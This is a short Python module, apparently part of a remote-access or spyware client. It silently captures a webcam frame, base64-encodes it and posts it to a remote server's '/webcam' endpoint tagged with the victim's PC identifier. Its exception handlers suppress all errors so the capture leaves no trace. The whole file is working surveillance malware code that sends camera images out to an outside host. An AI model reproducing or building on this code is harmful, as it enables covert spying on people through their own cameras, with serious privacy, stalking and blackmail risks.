import base64
from features.curlmanager import CurlManager
import cv2


def capture_and_send_webcam(cfc_instance):
    try:
        return _capture_with_opencv(cfc_instance)
    except Exception as e:
        pass


def _capture_with_opencv(cfc_instance):
    try:    
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            return
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return
        
        _, buffer = cv2.imencode('.png', frame)
        webcam_base64 = base64.b64encode(buffer).decode('utf-8')
        
        curl = CurlManager()
        curl.set_headers(cfc_instance.headers)
        
        webcam_data = {"data": webcam_base64}
        url = f"{cfc_instance.base_url}/webcam?pc_id={cfc_instance.client_data['pc_id']}"
        curl.post(url=url, json=webcam_data)
        
    except Exception as e:
        pass